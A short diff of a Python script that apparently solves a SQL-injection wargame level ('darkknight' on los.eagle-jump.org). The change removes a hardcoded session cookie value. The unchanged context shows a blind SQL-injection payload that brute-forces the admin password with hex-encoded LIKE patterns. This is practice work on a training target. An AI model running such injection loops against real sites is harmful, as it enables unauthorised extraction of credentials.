@@ -6,7 +6,7 @@ value = ""
 i = start
 
 url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php"
-cookies = {"PHPSESSID":"cf8bml1u8rep03adn37hkqm0v6"}
+cookies = {"PHPSESSID":""}
 
 while 1:
 	sql = "1 || (id like 0x61646d696e && pw like 0x"+value+chr(i).encode("hex")+"25) -- "
